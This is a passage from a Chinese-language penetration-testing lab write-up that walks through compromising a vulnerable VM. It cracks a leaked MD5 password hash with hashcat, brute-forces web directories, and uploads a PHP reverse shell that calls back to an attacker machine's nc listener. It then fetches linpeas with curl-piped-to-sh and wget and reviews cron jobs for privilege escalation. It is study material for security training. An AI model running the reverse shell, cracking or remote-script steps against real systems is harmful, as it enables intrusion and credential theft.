class="string">&#x27;, &#x27;</span><span class="string">&#x27;);**</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The **StudentRegno number** is what you use for login.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Le me know what you think of this open-source project, it&#x27;</span>s from 2020 so it should be secure... right ?</span><br><span class="line">We can always adapt it to our needs.</span><br><span class="line"></span><br><span class="line">**-jdelta**</span><br></pre></td></tr></table></figure>

<ul>
<li><p>這邊透漏了不少敏感訊息</p>
<ul>
<li><strong>StudentRegno &gt; 10201321</strong></li>
<li><strong>password &gt; cd73502828457d15655bbd7a63fb0bc8</strong></li>
<li><strong>studentName &gt; Rum Ham</strong></li>
<li><strong>pincode &gt; 777777</strong></li>
<li><strong>cgpa &gt; 7.60</strong></li>
<li><strong>creationdate &gt; 2021-05-29 14:36:56</strong></li>
</ul>
<p>  password應該是個hash，可以看看它是什麼類型的，幫助爆破</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **hash-identifier** </span><br><span class="line">   <span class="comment">#########################################################################</span></span><br><span class="line">   <span class="comment">#     __  __                     __           ______    _____           #</span></span><br><span class="line">   <span class="comment">#    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #</span></span><br><span class="line">   <span class="comment">#    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #</span></span><br><span class="line">   <span class="comment">#     \ \  _  \  /&#x27;__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #</span></span><br><span class="line">   <span class="comment">#      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #</span></span><br><span class="line">   <span class="comment">#       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #</span></span><br><span class="line">   <span class="comment">#        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #</span></span><br><span class="line">   <span class="comment">#                                                             By Zion3R #</span></span><br><span class="line">   <span class="comment">#                                                    www.Blackploit.com #</span></span><br><span class="line">   <span class="comment">#                                                   Root@Blackploit.com #</span></span><br><span class="line">   <span class="comment">#########################################################################</span></span><br><span class="line">--------------------------------------------------</span><br><span class="line"> HASH: **cd73502828457d15655bbd7a63fb0bc8**</span><br><span class="line"></span><br><span class="line">**Possible Hashs:</span><br><span class="line">[+] MD5</span><br><span class="line">[+] Domain Cached Credentials - MD4(MD4((<span class="variable">$pass</span>)).(strtolower(<span class="variable">$username</span>)))**</span><br><span class="line"></span><br><span class="line">Least Possible Hashs:</span><br><span class="line">[+] RAdmin v2.x</span><br><span class="line">[+] NTLM</span><br><span class="line">[+] MD4</span><br><span class="line">[+] MD2</span><br><span class="line">[+] MD5(HMAC)</span><br><span class="line">[+] MD4(HMAC)</span><br><span class="line">[+] MD2(HMAC)</span><br><span class="line">[+] MD5(HMAC(Wordpress))</span><br><span class="line">[+] Haval-128</span><br><span class="line">[+] Haval-128(HMAC)</span><br><span class="line">[+] RipeMD-128</span><br><span class="line">[+] RipeMD-128(HMAC)</span><br><span class="line">[+] SNEFRU-128</span><br><span class="line">[+] SNEFRU-128(HMAC)</span><br><span class="line">[+] Tiger-128</span><br><span class="line">[+] Tiger-128(HMAC)</span><br><span class="line">[+] md5(<span class="variable">$pass</span>.<span class="variable">$salt</span>)</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.<span class="variable">$pass</span>)</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.<span class="variable">$pass</span>.<span class="variable">$salt</span>)</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.<span class="variable">$pass</span>.<span class="variable">$username</span>)</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.md5(<span class="variable">$pass</span>))</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.md5(<span class="variable">$pass</span>))</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.md5(<span class="variable">$pass</span>.<span class="variable">$salt</span>))</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.md5(<span class="variable">$pass</span>.<span class="variable">$salt</span>))</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.md5(<span class="variable">$salt</span>.<span class="variable">$pass</span>))</span><br><span class="line">[+] md5(<span class="variable">$salt</span>.md5(md5(<span class="variable">$pass</span>).<span class="variable">$salt</span>))</span><br><span class="line">[+] md5(<span class="variable">$username</span>.0.<span class="variable">$pass</span>)</span><br><span class="line">[+] md5(<span class="variable">$username</span>.LF.<span class="variable">$pass</span>)</span><br><span class="line">[+] md5(<span class="variable">$username</span>.md5(<span class="variable">$pass</span>).<span class="variable">$salt</span>)</span><br><span class="line">[+] md5(md5(<span class="variable">$pass</span>))</span><br><span class="line">[+] md5(md5(<span class="variable">$pass</span>).<span class="variable">$salt</span>)</span><br><span class="line">[+] md5(md5(<span class="variable">$pass</span>).md5(<span class="variable">$salt</span>))</span><br><span class="line">[+] md5(md5(<span class="variable">$salt</span>).<span class="variable">$pass</span>)</span><br><span class="line">[+] md5(md5(<span class="variable">$salt</span>).md5(<span class="variable">$pass</span>))</span><br><span class="line">[+] md5(md5(<span class="variable">$username</span>.<span class="variable">$pass</span>).<span class="variable">$salt</span>)</span><br><span class="line">[+] md5(md5(md5(<span class="variable">$pass</span>)))</span><br><span class="line">[+] md5(md5(md5(md5(<span class="variable">$pass</span>))))</span><br><span class="line">[+] md5(md5(md5(md5(md5(<span class="variable">$pass</span>)))))</span><br><span class="line">[+] md5(sha1(<span class="variable">$pass</span>))</span><br><span class="line">[+] md5(sha1(md5(<span class="variable">$pass</span>)))</span><br><span class="line">[+] md5(sha1(md5(sha1(<span class="variable">$pass</span>))))</span><br><span class="line">[+] md5(strtoupper(md5(<span class="variable">$pass</span>)))</span><br><span class="line">--------------------------------------------------</span><br></pre></td></tr></table></figure>
<ul>
<li>大機率是跟md5 hash相關</li>
<li>搜尋google &gt; <a target="_blank" rel="noopener" href="https://www.4armed.com/blog/hashcat-crack-md5-hashes/">https://www.4armed.com/blog/hashcat-crack-md5-hashes/</a></li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Running hashcat to Crack MD5 Hashes</span><br><span class="line"></span><br><span class="line">Now we can start using hashcat with the rockyou wordlist to crack the MD5 hashes. The rockyou wordlist comes pre-installed with Kali. If you are not using Kali you can use another wordlist, or download it from here.</span><br><span class="line"></span><br><span class="line">The <span class="built_in">command</span> to start our dictionary attack on the hashes is:</span><br><span class="line"></span><br><span class="line">hashcat –m 0 hashes /usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">Argument	Function</span><br><span class="line">-m 0	Tells hashcat <span class="built_in">which</span> mode to use. 0 is MD5.</span><br><span class="line">Hashes	Our file containing the our MD5 password hashes.</span><br><span class="line">/usr/share/wordlists/rockyou.txt	Points hashcat to the wordlist containing the passwords to <span class="built_in">hash</span> and compare</span><br></pre></td></tr></table></figure>
<ul>
<li>hashcat &gt; 占用CPU，破解速度慢，可以的話用GPU跑</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **locate rockyou.txt <span class="comment">#rockyou.txt如果沒看到該檔案就去解壓縮**</span></span><br><span class="line">/usr/share/seclists/SecLists-master/Passwords/Leaked-Databases/rockyou.txt.tar.gz</span><br><span class="line">**/usr/share/wordlists/rockyou.txt**</span><br><span class="line">/usr/share/wordlists/rockyou.txt.gz</span><br><span class="line">                                                                                                                                                             </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **mousepad hash.txt <span class="comment">#cd73502828457d15655bbd7a63fb0bc8**                                                                  </span></span><br><span class="line">                                                                                                                                                             </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt**</span><br><span class="line">hashcat (v6.2.6) starting</span><br><span class="line"></span><br><span class="line">OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="comment">#1 [The pocl project]</span></span><br><span class="line">==================================================================================================================================================</span><br><span class="line">* Device <span class="comment">#1: cpu-haswell-AMD Ryzen 7 4800H with Radeon Graphics, 4184/8432 MB (2048 MB allocatable), 4MCU</span></span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">Hashes: 1 digests; 1 unique digests, 1 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Optimizers applied:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Early-Skip</span><br><span class="line">* Not-Salted</span><br><span class="line">* Not-Iterated</span><br><span class="line">* Single-Hash</span><br><span class="line">* Single-Salt</span><br><span class="line">* Raw-Hash</span><br><span class="line"></span><br><span class="line">ATTENTION! Pure (unoptimized) backend kernels selected.</span><br><span class="line">Pure kernels can crack longer passwords, but drastically reduce performance.</span><br><span class="line">If you want to switch to optimized kernels, append -O to your commandline.</span><br><span class="line">See the above message to find out about the exact limits.</span><br><span class="line"></span><br><span class="line">Watchdog: Temperature abort trigger <span class="built_in">set</span> to 90c</span><br><span class="line"></span><br><span class="line">Host memory required <span class="keyword">for</span> this attack: 1 MB</span><br><span class="line"></span><br><span class="line">Dictionary cache built:</span><br><span class="line">* Filename..: /usr/share/wordlists/rockyou.txt</span><br><span class="line">* Passwords.: 14344392</span><br><span class="line">* Bytes.....: 139921507</span><br><span class="line">* Keyspace..: 14344385</span><br><span class="line">* Runtime...: 2 secs</span><br><span class="line"></span><br><span class="line">**cd73502828457d15655bbd7a63fb0bc8:student**                  </span><br><span class="line">                                                          </span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Mode........: 0 (MD5)</span><br><span class="line">Hash.Target......: cd73502828457d15655bbd7a63fb0bc8</span><br><span class="line">Time.Started.....: Thu Feb 15 12:34:06 2024 (0 secs)</span><br><span class="line">Time.Estimated...: Thu Feb 15 12:34:06 2024 (0 secs)</span><br><span class="line">Kernel.Feature...: Pure Kernel</span><br><span class="line">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.#1.........:    71479 H/s (0.47ms) @ Accel:1024 Loops:1 Thr:1 Vec:8</span><br><span class="line">Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)</span><br><span class="line">Progress.........: 4096/14344385 (0.03%)</span><br><span class="line">Rejected.........: 0/4096 (0.00%)</span><br><span class="line">Restore.Point....: 0/14344385 (0.00%)</span><br><span class="line">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span><br><span class="line">Candidate.Engine.: Device Generator</span><br><span class="line">Candidates.#1....: 123456 -&gt; oooooo</span><br><span class="line">Hardware.Mon.#1..: Util: 25%</span><br><span class="line"></span><br><span class="line">Started: Thu Feb 15 12:33:24 2024</span><br><span class="line">Stopped: Thu Feb 15 12:34:08 2024</span><br></pre></td></tr></table></figure>
<ul>
<li>爆破出的密碼是<strong>student</strong>，但我們不知道要在哪裡進行登入</li>
<li>所以需要進行目錄爆破尋找登入介面</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# dirb http://192.168.19.141 <span class="comment">#嘗試所有可能，尋找目錄，會把所有成功、失敗的找尋過程都列出來</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Thu Feb 15 12:39:04 2024</span><br><span class="line">URL_BASE: http://192.168.19.141/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.19.141/ ----</span><br><span class="line">+ http://192.168.19.141/index.html (CODE:200|SIZE:10701)</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# ***apt install ffuf***</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.19.141/FUZZ**</span><br><span class="line"><span class="comment"># 只列出找到的</span></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\       </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\       </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.1.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://192.168.19.141/FUZZ</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: **200-299,301,302,307,401,403,405,500**</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># This work is licensed under the Creative Commons  [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 4ms]</span></span><br><span class="line"><span class="string"># Copyright 2007 James Fisher [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 3ms]</span></span><br><span class="line"><span class="string"># directory-list-2.3-medium.txt [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 6ms]</span></span><br><span class="line"><span class="string"># Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 4ms]</span></span><br><span class="line"><span class="string">#                       [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 4ms]</span></span><br><span class="line"><span class="string"># on atleast 2 different hosts [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 7ms]</span></span><br><span class="line"><span class="string">#                       [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 4ms]</span></span><br><span class="line"><span class="string">                        [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 5ms]</span></span><br><span class="line"><span class="string"># Priority ordered case sensative list, where entries were found  [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 318ms]</span></span><br><span class="line"><span class="string">#                       [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 667ms]</span></span><br><span class="line"><span class="string"># or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 1268ms]</span></span><br><span class="line"><span class="string">#                       [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 1310ms]</span></span><br><span class="line"><span class="string"># Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 1523ms]</span></span><br><span class="line"><span class="string"># license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 1572ms]</span></span><br><span class="line"><span class="string">**academy                 [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 3ms]</span></span><br><span class="line"><span class="string">phpmyadmin              [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 4ms]**</span></span><br><span class="line"><span class="string">                        [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 147ms]</span></span><br><span class="line"><span class="string">server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 9ms]</span></span><br><span class="line"><span class="string">:: Progress: [220560/220560] :: Job [1/1] :: 4347 req/sec :: Duration: [0:00:52] :: Errors: 0 ::</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p><strong>academy、phpmyadmin</strong></p>
</li>
<li><p>找到登陸目錄了，將剛找到了登入資訊輸入</p>
<p>  <img src="/img/privilege_Untitled_5.png" alt="Untitled"></p>
</li>
<li><p>登入後會看到該用戶訊息，也可以去看看網頁源碼也許有時那邊會有敏感消息沒被刪除</p>
<p>  <img src="/img/privilege_Untitled_6.png" alt="Untitled"></p>
</li>
<li><p>接下來找尋該網頁可以利用的地方，my-profile頁面發現一個可以進行上傳檔案功能的，也許有機會進行利用</p>
</li>
</ul>
<p>  <img src="/img/privilege_Untitled_7.png" alt="Untitled"></p>
<p>  <img src="/img/privilege_Untitled_8.png" alt="Untitled"></p>
<ul>
<li><p>並且開啟圖片，可以注意到它存在某個目錄下</p>
<p>  <img src="/img/privilege_Untitled_9.png" alt="Untitled"></p>
</li>
<li><p>也許可以上傳reverse shell，網頁由php撰寫</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</a></p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">set_time_limit (0);</span><br><span class="line"><span class="variable">$VERSION</span> = <span class="string">&quot;1.0&quot;</span>;</span><br><span class="line">**<span class="variable">$ip</span> = <span class="string">&#x27;192.168.19.130&#x27;</span>;  // attack vm</span><br><span class="line"><span class="variable">$port</span> = 4444;       // attack vm nc**</span><br><span class="line"><span class="variable">$chunk_size</span> = 1400;</span><br><span class="line"><span class="variable">$write_a</span> = null;</span><br><span class="line"><span class="variable">$error_a</span> = null;</span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&#x27;uname -a; w; id; /bin/sh -i&#x27;</span>;</span><br><span class="line"><span class="variable">$daemon</span> = 0;</span><br><span class="line"><span class="variable">$debug</span> = 0;</span><br><span class="line">....</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>可以對這些資訊進行修改，並將內容寫到shell.php中</p>
</li>
<li><p>先nc偵聽port，port是shell.php寫的，再將shell.php上傳到網頁中</p>
</li>
</ul>
<p>  <img src="/img/privilege_Untitled_10.png" alt="Untitled"></p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **nc -nlvp 4444**                             </span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [192.168.19.130] from (UNKNOWN) [192.168.19.141] 34072</span><br><span class="line">Linux academy 4.19.0-16-amd64 <span class="comment">#1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux</span></span><br><span class="line"> 13:44:39 up  2:29,  1 user,  load average: 0.00, 0.00, 0.08</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">root     tty1     -                11:16    2:23m  0.02s  0.01s -bash</span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">www-data</span></span><br><span class="line"><span class="string">$ sudo -l</span></span><br><span class="line"><span class="string">/bin/sh: 2: sudo: not found</span></span><br><span class="line"><span class="string">$ locate sudo</span></span><br><span class="line"><span class="string">/bin/sh: 3: locate: not found</span></span><br></pre></td></tr></table></figure>
<p>  可惜的是，我們並不是root最高權限的身分，需要進行提權</p>
<p>  <a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</a></p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~kali/Desktop/testscript]</span><br><span class="line">└─# **curl -L** https://github.com/carlospolop/PEASS-ng/releases/latest/download/**linpeas.sh | sh**</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<ul>
<li>前面成功利用上傳漏洞RCE到了目標機器，但不是最高權限，現在attack vm 的linpeas.sh的目錄開一個server，我們需要將這個提權腳本上傳到目標機器上，並賦予執行權限</li>
</ul>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~kali/Desktop/testscript/trans]</span><br><span class="line">└─# <span class="built_in">ls</span></span><br><span class="line">linpeas.sh</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~kali/Desktop/testscript/trans]</span><br><span class="line">└─# **python3 -m http.server 80**                                            </span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **nc -nlvp 4444**                             </span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [192.168.19.130] from (UNKNOWN) [192.168.19.141] 34072</span><br><span class="line">Linux academy 4.19.0-16-amd64 <span class="comment">#1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux</span></span><br><span class="line"> 13:44:39 up  2:29,  1 user,  load average: 0.00, 0.00, 0.08</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">root     tty1     -                11:16    2:23m  0.02s  0.01s -bash</span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$ cd /tmp       </span></span><br><span class="line"><span class="string">$ pwd</span></span><br><span class="line"><span class="string">/tmp</span></span><br><span class="line"><span class="string">$ **wget http://192.168.19.130/linpeas.sh #填入我們開伺服器(attack vm)的IP**</span></span><br><span class="line"><span class="string">--2024-02-15 14:07:43--  http://192.168.19.130/linpeas.sh</span></span><br><span class="line"><span class="string">Connecting to 192.168.19.130:80... connected.</span></span><br><span class="line"><span class="string">HTTP request sent, awaiting response... 200 OK</span></span><br><span class="line"><span class="string">Length: 853290 (833K) [text/x-sh]</span></span><br><span class="line"><span class="string">Saving to: &#x27;</span>linpeas.sh<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">     0K .......... .......... .......... .......... ..........  6% 7.45M 0s</span></span><br><span class="line"><span class="string">    50K .......... .......... .......... .......... .......... 12% 8.95M 0s</span></span><br><span class="line"><span class="string">   100K .......... .......... .......... .......... .......... 18% 30.6M 0s</span></span><br><span class="line"><span class="string">   150K .......... .......... .......... .......... .......... 24% 23.9M 0s</span></span><br><span class="line"><span class="string">   200K .......... .......... .......... .......... .......... 30% 25.1M 0s</span></span><br><span class="line"><span class="string">   250K .......... .......... .......... .......... .......... 36% 20.1M 0s</span></span><br><span class="line"><span class="string">   300K .......... .......... .......... .......... .......... 42% 44.6M 0s</span></span><br><span class="line"><span class="string">   350K .......... .......... .......... .......... .......... 48% 92.5M 0s</span></span><br><span class="line"><span class="string">   400K .......... .......... .......... .......... .......... 54% 64.9M 0s</span></span><br><span class="line"><span class="string">   450K .......... .......... .......... .......... .......... 60% 11.7M 0s</span></span><br><span class="line"><span class="string">   500K .......... .......... .......... .......... .......... 66% 6.96M 0s</span></span><br><span class="line"><span class="string">   550K .......... .......... .......... .......... .......... 72% 20.9M 0s</span></span><br><span class="line"><span class="string">   600K .......... .......... .......... .......... .......... 78% 32.4M 0s</span></span><br><span class="line"><span class="string">   650K .......... .......... .......... .......... .......... 84%  190M 0s</span></span><br><span class="line"><span class="string">   700K .......... .......... .......... .......... .......... 90%  198M 0s</span></span><br><span class="line"><span class="string">   750K .......... .......... .......... .......... .......... 96%  262M 0s</span></span><br><span class="line"><span class="string">   800K .......... .......... .......... ...                  100% 18.4M=0.04s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2024-02-15 14:07:43 (20.4 MB/s) - &#x27;</span>linpeas.sh<span class="string">&#x27; saved [853290/853290]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$ ls</span></span><br><span class="line"><span class="string">linpeas.sh</span></span><br><span class="line"><span class="string">$ chmod +x linpeas.sh</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
<p>  先來看看linpeas.sh執行了什麼</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./linpeas.sh</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">LEGEND:                                                                                                                      </span><br><span class="line">  RED/YELLOW: 95% a PE vector  <span class="comment">#可以專注在查看RED</span></span><br><span class="line">  RED: You should take a look to it</span><br><span class="line">  LightCyan: Users with console</span><br><span class="line">  Blue: Users without console &amp; mounted devs</span><br><span class="line">  Green: Common things (<span class="built_in">users</span>, <span class="built_in">groups</span>, SUID/SGID, mounts, .sh scripts, cronjobs) </span><br><span class="line">  LightMagenta: Your username</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">╔════════════════════╗</span><br><span class="line">══════════════════════════════╣ System Information ╠══════════════════════════════                                            </span><br><span class="line">                              ╚════════════════════╝                                                                          </span><br><span class="line">╔══════════╣ Operative system</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                            </span><br><span class="line">Linux version 4.19.0-16-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) <span class="comment">#1 SMP Debian 4.19.181-1 (2021-03-19)</span></span><br><span class="line">Distributor ID: Debian</span><br><span class="line">Description:    Debian GNU/Linux 10 (buster)</span><br><span class="line">Release:        10</span><br><span class="line">Codename:       buster</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">╔══════════╣ Cron <span class="built_in">jobs</span></span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs                                        </span><br><span class="line">/usr/bin/crontab                                                                                                              </span><br><span class="line">incrontab Not Found</span><br><span class="line">-rw-r--r-- 1 root root    1077 Jun 16  2021 /etc/crontab                                                                      </span><br><span class="line"></span><br><span class="line">/etc/cron.d:</span><br><span class="line">total 16</span><br><span class="line">drwxr-xr-x  2 root root 4096 May 29  2021 .</span><br><span class="line">drwxr-xr-x 74 root root 4096 Feb 15 14:08 ..</span><br><span class="line">-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder</span><br><span class="line">-rw-r--r--  1 root root  712 Dec 17  2018 php</span><br><span class="line"></span><br><span class="line">/etc/cron.daily:</span><br><span class="line">total 40</span><br><span class="line">drwxr-xr-x  2 root root 4096 May 29  2021 .</span><br><span class="line">drwxr-xr-x 74 root root 4096 Feb 15 14:08 ..</span><br><span class="line">-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder</span><br><span class="line">-rwxr-xr-x  1 root root  539 Aug  8  2020 apache2</span><br><span class="line">-rwxr-xr-x  1 root root 1478 May 12  2020 apt-compat</span><br><span class="line">-rwxr-xr-x  1 root root  355 Dec 29  2017 bsdmainutils</span><br><span class="line">-rwxr-xr-x  1 root root 1187 Apr 18  2019 dpkg</span><br><span class="line">-rwxr-xr-x  1 root root  377 Aug 28  2018 logrotate</span><br><span class="line">-rwxr-xr-x  1 root root 1123 Feb 10  2019 man-db</span><br><span class="line">-rwxr-xr-x  1 root root  249 Sep 27  2017 passwd</span><br><span class="line"></span><br><span class="line">/etc/cron.hourly:</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x  2 root root 4096 May 29  2021 .</span><br><span class="line">drwxr-xr-x 74 root root 4096 Feb 15 14:08 ..</span><br><span class="line">-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder</span><br><span class="line"></span><br><span class="line">/etc/cron.monthly:</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x  2 root root 4096 May 29  2021 .</span><br><span class="line">drwxr-xr-x 74 root root 4096 Feb 15 14:08 ..</span><br><span class="line">-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder</span><br><span class="line"></span><br><span class="line">/etc/cron.weekly:</span><br><span class="line">total 16</span><br><span class="line">drwxr-xr-x  2 root root 4096 May 29  2021 .</span><br><span class="line">drwxr-xr-x 74 root root 4096 Feb 15 14:08 ..</span><br><span class="line">-rw-r--r--  1 root root  102 Oct 11  2019 .placeholder</span><br><span class="line">-rwxr-xr-x  1 root root  813 Feb 10  2019 man-db</span><br><span class="line"></span><br><span class="line">SHELL=/bin/sh</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line">...</span><br><span class="line">* * * * * /home/grimmie/backup.sh</span><br><span class="line"></span><br><span 